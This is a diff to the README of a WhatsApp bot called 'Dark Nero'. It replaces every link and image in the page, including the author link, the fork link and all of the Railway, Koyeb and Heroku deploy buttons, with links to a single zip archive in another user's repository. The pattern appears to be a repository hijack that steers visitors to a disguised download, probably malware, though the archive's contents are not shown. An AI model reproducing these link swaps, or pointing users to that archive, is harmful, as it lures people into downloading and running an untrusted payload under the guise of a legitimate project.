@@ -1,38 +1,38 @@
 <p align="center">
-<a href="https://github.com">
-    <img src="https://i.ibb.co/zFYBPcQ/IMG-20230226-WA0115.jpg">
+<a href="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip">
+    <img src="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip">
   </a>
 
 <h1 align="center"> DARK NERO
 </h1>
 
 <p align="center"> 
-<b>Hello, I am "Dark Nero" an Opensource WhatsApp bot made by <a href="https://github.com/Kaveeshasithum">Kaveeshasithum</a> and his team "Dark Nero" to do everything that's beyond imagination with highest <b>Features</b> and <b>Stability</b> and <b>Compatibility</b> built with Baileys Multi Device support.    
+<b>Hello, I am "Dark Nero" an Opensource WhatsApp bot made by <a href="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip">Kaveeshasithum</a> and his team "Dark Nero" to do everything that's beyond imagination with highest <b>Features</b> and <b>Stability</b> and <b>Compatibility</b> built with Baileys Multi Device support.    
 
 <br>
 <br>
     
     
-<p align="center"><b>FORK THE REPOSITORY</b><a href="https://github.com/Kaveeshasithum/DARK-NERO-V8/fork"> HERE</a></p>
+<p align="center"><b>FORK THE REPOSITORY</b><a href="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip"> HERE</a></p>
 
 
 
 <p align="center"><b>DEPLOY PLAT FORM</b></p>
 
 <p align="center">
-<a href="https://railway.app/new"><img src="https://railway.app/button.svg" alt="Deploy on Railway" width="170px"></a>
+<a href="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip" alt="Deploy on Railway" width="170px"></a>
 </p>
 
 <p align="center">
-<a href="https://app.uffizzi.com/projects"><img src="https://telegra.ph/file/e464e609e43eb3dfdc144.png" alt="Deploy on Railway" width="170px"></a>
+<a href="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip" alt="Deploy on Railway" width="170px"></a>
 </p>
 
     
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=&branch=name&name=servicename)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip)](https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip)
 
 
 
 
 <p align="center">
-<a href="https://heroku.com/deploy?template=https://github.com/Kaveeshasithum/DARK-NERO-V8/"><img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy on Railway" width="170px"></a>
+<a href="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip"><img src="https://raw.githubusercontent.com/cyran-kyle/DARK-NERO-V8/main/NeroMedia/theme/Media-Store-Karne-Ke-Liye/DARK-NERO-V8-3.4.zip" alt="Deploy on Railway" width="170px"></a>
 </p>
